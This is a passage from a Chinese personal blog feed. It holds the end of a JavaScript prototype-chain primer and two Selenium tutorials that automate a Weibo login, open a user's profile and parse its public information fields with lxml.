class="hljs-literal">null</span>;<br><span class="hljs-built_in">console</span>.log(a==b)<br></code></pre></td></tr></table></figure></p><h2 id="Javascript调试"><a href="#Javascript调试" class="headerlink" title="Javascript调试"></a>Javascript调试</h2><p>一般来说调试Javascript代码采用两种调试方法，console.log控制台调试还有断点调试（不建议使用alert，因为会中断）</p><h2 id="Javascript原型链"><a href="#Javascript原型链" class="headerlink" title="Javascript原型链"></a>Javascript原型链</h2><p>在Javascript中，万物皆对象。<br>在Javascript中没有类的概念，但是可以通过原型链来达到类继承的目的。</p><p>举例：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">info</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-built_in">this</span>.name=<span class="hljs-string">&quot;等风&quot;</span>;<br><span class="hljs-built_in">this</span>.age=<span class="hljs-number">19</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">qq</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-built_in">this</span>.QQ=<span class="hljs-number">1440416491</span>;<br>&#125;<br><br>info.prototype=<span class="hljs-keyword">new</span> qq();<br><br>myinfo=<span class="hljs-keyword">new</span> info();<br><br><span class="hljs-built_in">console</span>.log(myinfo.QQ);<br><span class="hljs-comment">//144041491</span><br></code></pre></td></tr></table></figure><br>可以看到上面的info并没有QQ这一成员，但却访问到了QQ，这说明info通过“父类”qq继承到了QQ；同理，qq也可以有自己的父类，这样可以一直“溯源”，直到prototype为null为止。在这里解释一下上面程序运行的结果吧，javascript调用成员先会在自己的对象里面找，如果找不到就去对象的原型里面找，一直这样找，找到就返回，找不到就算了。</p><h2 id="Prospect"><a href="#Prospect" class="headerlink" title="Prospect"></a>Prospect</h2><p>Javascript的学习暂时就告一段落了（够用就行），过几天再把原型链污染学习一下，然后再来更blog吧hhh</p><p><a href="https://imgse.com/i/xN4Xan"><img src="https://s1.ax1x.com/2022/10/11/xN4Xan.png" alt="xN4Xan.png"></a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
      <category>Web基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>爬虫项目(2)——微博个人信息获取</title>
    <link href="/2022/10/10/%E7%88%AC%E8%99%AB%E9%A1%B9%E7%9B%AE(2)/"/>
    <url>/2022/10/10/%E7%88%AC%E8%99%AB%E9%A1%B9%E7%9B%AE(2)/</url>
    
    <content type="html"><![CDATA[<h1 id="selenium爬虫项目-2-——微博个人信息获取"><a href="#selenium爬虫项目-2-——微博个人信息获取" class="headerlink" title="selenium爬虫项目(2)——微博个人信息获取"></a>selenium爬虫项目(2)——微博个人信息获取</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>最近事情有点多，鸽到了现在（其实是国庆玩嗨了）。最近抽时间把第二部分功能基本完成了，虽然后续代码可能会重构一次，不过还是写一次blog记录一下。<br><a href="https://imgse.com/i/xthGr9"><img src="https://s1.ax1x.com/2022/10/11/xthGr9.png" alt="xthGr9.png"></a></p><h2 id="step1-登录之后搜索用户的id，并选择第一条检索记录进入"><a href="#step1-登录之后搜索用户的id，并选择第一条检索记录进入" class="headerlink" title="step1 登录之后搜索用户的id，并选择第一条检索记录进入"></a>step1 登录之后搜索用户的id，并选择第一条检索记录进入</h2><p>这里以搜索用户id“等风”为例。</p><h3 id="Code"><a href="#Code" class="headerlink" title="Code:"></a>Code:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> sys<br><br>non_bmp_map=<span class="hljs-built_in">dict</span>.fromkeys(<span class="hljs-built_in">range</span>(<span class="hljs-number">0x10000</span>,sys.maxunicode+<span class="hljs-number">1</span>),<span class="hljs-number">0xfffd</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    chrome_driver=<span class="hljs-string">&#x27;C:\\Users\\lenovo\\Anaconda3\\Lib\\site-packages\\chromedriver.exe&#x27;</span><br>    driver = webdriver.Chrome(executable_path = chrome_driver)<br>    driver.get(<span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span>)<br>    <span class="hljs-comment">#driver.get(&#x27;https://weibo.com/u/7791772275/home?wvr=5&#x27;)</span><br>    <span class="hljs-keyword">try</span>:<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;kw&quot;]&#x27;</span>).click()<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;kw&quot;]&#x27;</span>).send_keys(<span class="hljs-string">&#x27;微博&#x27;</span>)<br>        time.sleep(<span class="hljs-number">3</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;su&quot;]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">2</span>)<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;1&quot;]/div/div[1]/h3/a[1]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">10</span>)<br><br>        handles=driver.window_handles<br>        <span class="hljs-keyword">for</span> handle <span class="hljs-keyword">in</span> handles:<br>            <span class="hljs-keyword">if</span> handle!=driver.current_window_handle:<br>                driver.close()<br>                driver.switch_to.window(handle)<br>        driver.execute_script(<span class="hljs-string">&quot;window.scrollBy(0,3000)&quot;</span>)<br>        time.sleep(<span class="hljs-number">5</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;app&quot;]/div[1]/div[1]/div[2]/div[1]/div/div/div[3]/div[1]/div/a[1]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">5</span>)<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;app&quot;]/div[4]/div[1]/div/div[2]/div/div/div[5]/a[1]&#x27;</span>).click()<br><br>        handles=driver.window_handles<br>        <span class="hljs-keyword">for</span> handle <span class="hljs-keyword">in</span> handles:<br>            <span class="hljs-keyword">if</span> handle!=driver.current_window_handle:<br>                driver.close()<br>                driver.switch_to.window(handle)<br>        time.sleep(<span class="hljs-number">10</span>)<br>        <br>        <br>        driver.find_element_by_id(<span class="hljs-string">&quot;loginname&quot;</span>).click()<br>        driver.find_element_by_id(<span class="hljs-string">&quot;loginname&quot;</span>).send_keys(<span class="hljs-string">&quot;你的账号&quot;</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;pl_login_form&quot;]/div/div[3]/div[2]/div/span&#x27;</span>).click()<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;pl_login_form&quot;]/div/div[3]/div[2]/div/input&#x27;</span>).send_keys(<span class="hljs-string">&#x27;你的密码&#x27;</span>)<br>        time.sleep(<span class="hljs-number">5</span>)<br>        driver.find_element_by_class_name(<span class="hljs-string">&#x27;W_btn_a&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">5</span>)<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;dmCheck&quot;]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">1</span>)<br>        driver.find_element_by_id(<span class="hljs-string">&#x27;send_dm_btn&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">20</span>)<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;plc_top&quot;]/div/div/div[2]/input&#x27;</span>).click()  <span class="hljs-comment">#点击搜索框</span><br>        time.sleep(<span class="hljs-number">20</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;plc_top&quot;]/div/div/div[2]/input&#x27;</span>).send_keys(<span class="hljs-string">&quot;等风&quot;</span>) <span class="hljs-comment">#输入“等风”</span><br>        time.sleep(<span class="hljs-number">10</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;plc_top&quot;]/div/div/div[2]/a&#x27;</span>).click()   <span class="hljs-comment">#点击搜索</span><br>        time.sleep(<span class="hljs-number">2</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;/html/body/div[1]/div[2]/ul/li[2]/a&#x27;</span>).click()   <span class="hljs-comment">#点击“找人”按钮</span><br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;pl_user_feedList&quot;]/div[1]/div[2]/div/a[1]&#x27;</span>).click()    <span class="hljs-comment">#点击第一条检索记录</span><br>        <br>        time.sleep(<span class="hljs-number">5</span>)<br>        handles=driver.window_handles    <br>        <span class="hljs-keyword">for</span> handle <span class="hljs-keyword">in</span> handles:     <span class="hljs-comment">#关闭之前的界面</span><br>            <span class="hljs-keyword">if</span> handle!=driver.current_window_handle:<br>                driver.close()<br>                driver.switch_to.window(handle)<br>        time.sleep(<span class="hljs-number">10</span>)<br><span class="hljs-keyword">finally</span>:<br>        time.sleep(<span class="hljs-number">30</span>)<br>        driver.quit()<br><br></code></pre></td></tr></table></figure><h3 id="Explanation"><a href="#Explanation" class="headerlink" title="Explanation"></a>Explanation</h3><p>这一步也就是基本操作，找到按键的xpath，调用点击相应位置即可，结果如图：</p><p><a href="https://imgse.com/i/xthBxe"><img src="https://s1.ax1x.com/2022/10/11/xthBxe.png" alt="xthBxe.png"></a> </p><h2 id="step2-进入用户的个人信息界面并保存页面源代码"><a href="#step2-进入用户的个人信息界面并保存页面源代码" class="headerlink" title="step2 进入用户的个人信息界面并保存页面源代码"></a>step2 进入用户的个人信息界面并保存页面源代码</h2><h3 id="Code-1"><a href="#Code-1" class="headerlink" title="Code:"></a>Code:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> sys<br><br>non_bmp_map=<span class="hljs-built_in">dict</span>.fromkeys(<span class="hljs-built_in">range</span>(<span class="hljs-number">0x10000</span>,sys.maxunicode+<span class="hljs-number">1</span>),<span class="hljs-number">0xfffd</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    chrome_driver=<span class="hljs-string">&#x27;C:\\Users\\lenovo\\Anaconda3\\Lib\\site-packages\\chromedriver.exe&#x27;</span><br>    driver = webdriver.Chrome(executable_path = chrome_driver)<br>    driver.get(<span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span>)<br>    <span class="hljs-comment">#driver.get(&#x27;https://weibo.com/u/7791772275/home?wvr=5&#x27;)</span><br>    <span class="hljs-keyword">try</span>:<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;kw&quot;]&#x27;</span>).click()<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;kw&quot;]&#x27;</span>).send_keys(<span class="hljs-string">&#x27;微博&#x27;</span>)<br>        time.sleep(<span class="hljs-number">3</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;su&quot;]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">2</span>)<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;1&quot;]/div/div[1]/h3/a[1]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">10</span>)<br><br>        handles=driver.window_handles<br>        <span class="hljs-keyword">for</span> handle <span class="hljs-keyword">in</span> handles:<br>            <span class="hljs-keyword">if</span> handle!=driver.current_window_handle:<br>                driver.close()<br>                driver.switch_to.window(handle)<br>        driver.execute_script(<span class="hljs-string">&quot;window.scrollBy(0,3000)&quot;</span>)<br>        time.sleep(<span class="hljs-number">5</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;app&quot;]/div[1]/div[1]/div[2]/div[1]/div/div/div[3]/div[1]/div/a[1]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">5</span>)<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;app&quot;]/div[4]/div[1]/div/div[2]/div/div/div[5]/a[1]&#x27;</span>).click()<br><br>        handles=driver.window_handles<br>        <span class="hljs-keyword">for</span> handle <span class="hljs-keyword">in</span> handles:<br>            <span class="hljs-keyword">if</span> handle!=driver.current_window_handle:<br>                driver.close()<br>                driver.switch_to.window(handle)<br>        time.sleep(<span class="hljs-number">10</span>)<br>        <br>        <br>        driver.find_element_by_id(<span class="hljs-string">&quot;loginname&quot;</span>).click()<br>        driver.find_element_by_id(<span class="hljs-string">&quot;loginname&quot;</span>).send_keys(<span class="hljs-string">&quot;你的账号&quot;</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;pl_login_form&quot;]/div/div[3]/div[2]/div/span&#x27;</span>).click()<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;pl_login_form&quot;]/div/div[3]/div[2]/div/input&#x27;</span>).send_keys(<span class="hljs-string">&#x27;你的密码&#x27;</span>)<br>        time.sleep(<span class="hljs-number">5</span>)<br>        driver.find_element_by_class_name(<span class="hljs-string">&#x27;W_btn_a&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">5</span>)<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;dmCheck&quot;]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">1</span>)<br>        driver.find_element_by_id(<span class="hljs-string">&#x27;send_dm_btn&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">20</span>)<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;plc_top&quot;]/div/div/div[2]/input&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">20</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;plc_top&quot;]/div/div/div[2]/input&#x27;</span>).send_keys(<span class="hljs-string">&quot;等风&quot;</span>)<br>        time.sleep(<span class="hljs-number">10</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;plc_top&quot;]/div/div/div[2]/a&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">2</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;/html/body/div[1]/div[2]/ul/li[2]/a&#x27;</span>).click()<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;pl_user_feedList&quot;]/div[1]/div[2]/div/a[1]&#x27;</span>).click()<br>        <br>        time.sleep(<span class="hljs-number">5</span>)<br>        handles=driver.window_handles<br>        <span class="hljs-keyword">for</span> handle <span class="hljs-keyword">in</span> handles:<br>            <span class="hljs-keyword">if</span> handle!=driver.current_window_handle:<br>                driver.close()<br>                driver.switch_to.window(handle)<br>        time.sleep(<span class="hljs-number">10</span>)<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_UserInfo__6&quot;]/div[2]/div[1]/div/a/span&#x27;</span>).click()  <span class="hljs-comment">#点击“查看更多”获取更多信息</span><br>        time.sleep(<span class="hljs-number">5</span>)<br>        handles=driver.window_handles<br>        <span class="hljs-keyword">for</span> handle <span class="hljs-keyword">in</span> handles:    <span class="hljs-comment">#关闭之前的界面</span><br>            <span class="hljs-keyword">if</span> handle!=driver.current_window_handle:<br>                driver.close()<br>                driver.switch_to.window(handle)<br>        time.sleep(<span class="hljs-number">10</span>)<br>        source=driver.page_source   <span class="hljs-comment">#获取页面源代码</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;information.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(<span class="hljs-built_in">str</span>(source).translate(non_bmp_map)) <span class="hljs-comment">#这里的处理方式是为了能让中文正确编码写入文件之中</span><br><br>        <span class="hljs-comment">#driver.find_element_by_xpath(&#x27;//*[@id=&quot;Pl_Core_T8CustomTriColumn__50&quot;]/div/div/div/table/tbody/tr/td[1]/a/strong&#x27;).click()</span><br>        <br><br>        <br>    <span class="hljs-keyword">finally</span>:<br>        time.sleep(<span class="hljs-number">30</span>)<br>        driver.quit()<br></code></pre></td></tr></table></figure><h3 id="Explanation-1"><a href="#Explanation-1" class="headerlink" title="Explanation"></a>Explanation</h3><p>这一步基本上也是不断用xpath点击，但是需要注意的是获取页面源代码之前要将页面句柄调整到正确的位置，否则获取的页面可能不是你想要的，我采取的是直接关掉之前的页面。还有一点就是如果直接把源代码转成字符串存到文件里会发现报错，解决方法如上。</p><h2 id="step3-从存储的html文件中提取出所需要的信息"><a href="#step3-从存储的html文件中提取出所需要的信息" class="headerlink" title="step3 从存储的html文件中提取出所需要的信息"></a>step3 从存储的html文件中提取出所需要的信息</h2><h3 id="Code-2"><a href="#Code-2" class="headerlink" title="Code:"></a>Code:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;information.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data=f.read()<br><br>html=etree.HTML(data)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>    tmp1=html.xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Official_PersonalInfo__54&quot;]/div[1]/div/div[2]/div/ul/li[%d]/span[1]&#x27;</span>%i)<br>    tmp=html.xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Official_PersonalInfo__54&quot;]/div[1]/div/div[2]/div/ul/li[%d]/span[2]&#x27;</span>%i)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(tmp)):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(tmp1[j].text).strip()+<span class="hljs-string">&#x27; : &#x27;</span> +<span class="hljs-built_in">str</span>(tmp[j].text).strip())<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>    tmp1=html.xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Official_PersonalInfo__54&quot;]/div[2]/div/div[2]/div/ul/li[%d]/span[1]&#x27;</span>%i)<br>    tmp=html.xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Official_PersonalInfo__54&quot;]/div[2]/div/div[2]/div/ul/li[%d]/span[2]&#x27;</span>%i)<br>    <br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(tmp)):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(tmp1[j].text).strip()+<span class="hljs-string">&#x27; : &#x27;</span> +<span class="hljs-built_in">str</span>(tmp[j].text).strip())<br><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>    tmp1=html.xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Official_PersonalInfo__54&quot;]/div[3]/div/div[2]/div/ul/li[%d]/span[1]&#x27;</span>%i)<br>    tmp=html.xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Official_PersonalInfo__54&quot;]/div[3]/div/div[2]/div/ul/li[%d]/span[2]/a&#x27;</span>%i)<br>    <br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(tmp)):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(tmp1[j].text).strip()+<span class="hljs-string">&#x27; : &#x27;</span> +<span class="hljs-built_in">str</span>(tmp[j].text).strip())<br><br>xpath=<span class="hljs-string">&#x27;//span[@class=&quot;pt_detail&quot;]/a[@target=&quot;_blank&quot;]/text()&#x27;</span><br>a=[]<br>b=html.xpath(xpath)<br>res=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(b)):<br>    res+=b[i].split()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;标签信息&quot;</span>,res)<br></code></pre></td></tr></table></figure><h3 id="Explanation-2"><a href="#Explanation-2" class="headerlink" title="Explanation"></a>Explanation</h3><p>这一步需要了解lxml库的基本用法，同时也要去网上搜索学习一下xpath语法，然后基于xpath语法用lxml库筛选出我们所需要的信息。由于微博个人信息界面的html不太规整，因此上面的代码大多数情况下可以正确运行，但是在出现某些特殊结构的时候不能正确工作。这一步留到后面加以改进，尽量做到信息不重不漏。<br>例：<br><a href="https://imgse.com/i/xthrKH"><img src="https://s1.ax1x.com/2022/10/11/xthrKH.png" alt="xthrKH.png"></a></p>]]></content>
    
    
    <categories>
      
      <category>项目</category>
      
      <category>爬虫</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>爬虫项目(1)——微博自动登录</title>
    <link href="/2022/09/22/%E7%88%AC%E8%99%AB%E9%A1%B9%E7%9B%AE/"/>
    <url>/2022/09/22/%E7%88%AC%E8%99%AB%E9%A1%B9%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="selenium爬虫项目-1-——微博自动登录"><a href="#selenium爬虫项目-1-——微博自动登录" class="headerlink" title="selenium爬虫项目(1)——微博自动登录"></a>selenium爬虫项目(1)——微博自动登录</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>最近上了内容安全的选修课，接触了爬虫和反爬技术，于是写下了这篇blog记录开发过程，同时也方便大家参考改进。（注：本文仅做技术讨论，禁止滥用爬虫技术！）</p><h2 id="Step-1-注册一个微博账号"><a href="#Step-1-注册一个微博账号" class="headerlink" title="Step 1 注册一个微博账号"></a>Step 1 注册一个微博账号</h2><p><a href="https://imgse.com/i/xk9oZD"><img src="https://s1.ax1x.com/2022/09/22/xk9oZD.png" alt="xk9oZD.png"></a></p><h2 id="step-2-配置selenium和浏览器"><a href="#step-2-配置selenium和浏览器" class="headerlink" title="step 2 配置selenium和浏览器"></a>step 2 配置selenium和浏览器</h2><p>这一步在网上都有教程，能打开网页就说明配置成功了。</p><h2 id="step-3-利用selenium打开百度搜索“微博”"><a href="#step-3-利用selenium打开百度搜索“微博”" class="headerlink" title="step 3 利用selenium打开百度搜索“微博”"></a>step 3 利用selenium打开百度搜索“微博”</h2><h3 id="Code："><a href="#Code：" class="headerlink" title="Code："></a>Code：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    chrome_driver=<span class="hljs-string">&#x27;C:\\Users\\lenovo\\Anaconda3\\Lib\\site-packages\\chromedriver.exe&#x27;</span><br>    driver = webdriver.Chrome(executable_path = chrome_driver)<br>    driver.get(<span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span>)    <span class="hljs-comment">#访问百度</span><br>    <span class="hljs-keyword">try</span>:<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;kw&quot;]&#x27;</span>).click() <span class="hljs-comment">#点击输入框</span><br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;kw&quot;]&#x27;</span>).send_keys(<span class="hljs-string">&#x27;微博&#x27;</span>) <span class="hljs-comment">#输入微博</span><br>        time.sleep(<span class="hljs-number">3</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;su&quot;]&#x27;</span>).click()  <span class="hljs-comment">#点击百度一下</span><br>        time.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        time.sleep(<span class="hljs-number">30</span>)<br>        